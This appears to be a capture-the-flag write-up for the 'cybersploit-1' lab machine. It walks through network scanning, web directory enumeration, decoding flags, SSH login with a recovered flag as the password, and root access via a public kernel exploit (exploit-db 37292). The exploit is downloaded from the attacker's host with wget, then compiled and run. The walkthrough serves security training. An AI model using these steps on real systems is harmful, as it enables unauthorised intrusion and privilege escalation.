# cybersploit-1

### 1. scoping the machine 
- used arp-scan to find the ip of the machine with the help of the mac address
    - `sudo arp-scan -l`

- IP : 192.168.1.36

### recon
- used nmap to find the open ports and there services 
    - `nmap -A -T5 192.168.1.36` 
- from the nmap scan we found that there is 2 ports open in the machine.
- to find any hidden ports i did a full port scan.
    - `nmap -A -T5 -p- 192.168.1.36` 
- no hidden ports was found.
- the ports that i got was 
    1. 22 ssh 
    2. 80 http
- with the port 80 open and http is running we got that there is a web-interface.
- after getting access to the web-interface using a browser and the ip.
- i used the developer console to see the source code to check is there is any hardcoded secret in the frontend.
- there was no secrets or passwords but i got a username.
    - _itsskv_


### enumeration
- with the 80 http port open i know that there is a web interface so i used the ip and a web browser to access the web interface of the machine.
- in the web interface i did a dir-enumeration using the ffuf tool.
    - `ffuf -u http://192.168.1.36/FUZZ -w /wordlists/Seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -s -mc 200`
    - in the dir enumeration we got 3 files.
        1. index
        2. robots
        3. hacker
- in the _hacker_ i found a gif 
- in the _robots_ i found a flag
- the _index_ was the loading page

- _gif examination_
    - i investigated the hacker.gif from the _http://192.168.1.36/hacker_ file using _exiftool_ 
    - there was no valid data.
    - used binwalk to check if there is any hidden embedded bin file in side the gif.
- _flag examination_
    - next i investigated the _flag_ i got from the _http://192.168.1.36/robots_.
    - used the cyberchef to decode the flag we got.
        - `Good Work ! Flag1: cybersploit{youtube.com/c/cybersploit}`

### Inital Access
- the information we got till now is 
    - ip : 192.168.1.36
    - username : itsskv 
    - flag : cybersploit{youtube.com/c/cybersploit}
- with the info above and the other port open that is 22 ssh, I tried to login to the ssh with the flag as the password.
- I got access to the ssh of the server.
- but my user has no root permission.
- the home directory had the flag2 in binary.
- after converting the binary to ASCII.
- I got _flag 2 : good work ! flag2: cybersploit{https:t.me/cybersploit1}_
- there was no other files rather that some empty directories in the home directory.

### post exploitation ( privilege escalation )
- both the flags was not the password for the root.
- the user was not in the sudoers file.
- next i tried to find other privilege escalation methods like
    1. suid misconfig
    2. sudo misconfig
    3. kernel level vulnerability

- _suid misconfig_ : I didn't get any binary that i can use to get root shell access.
- _sudo misconfig_ : the sudoers file was properly configured so this also was a miss.
- _kernel vulnerability_ : there was a kernel vulnerability in the server.
    - the machine uses the kernel 3.13.0-32-generic
    - and the os is ubuntu 12.04
    - I found a vulnerability that matches for this OS and Kernel in exploitdb

#### privilege escalation
- this is the exploit we are using _https://www.exploit-db.com/exploits/37292_- the exploit is written in "C program" and it is a local privilege escalation vulnerability.
- so I hosted a local server using python and used the server to donwload the exploit to the cybersploit machine.
    - python server hosting command (localy) : `python3 -m http.server`
    - after that you can use the wget in the cybersploit machine to donwload the exploit from the local host of the attack machine `http://127.0.0.1:8000/37292.c'
    - in this case we are using the local host but in real world scenario we will be using C2 servers.
    - `wget http://192.168.1.9:8000/37292.c`
    - compile and run the c file inside the cybersploit machine and I got the root access
    - use the GCC build in compiler to compile the c program file and you will get a binary file named a.out
    - run the a.out file and you will get the root access of the machine.
    - after getting the root shell ( check with whoami ) go the _/root_ and there you will find the final flag and the machine is completed.












































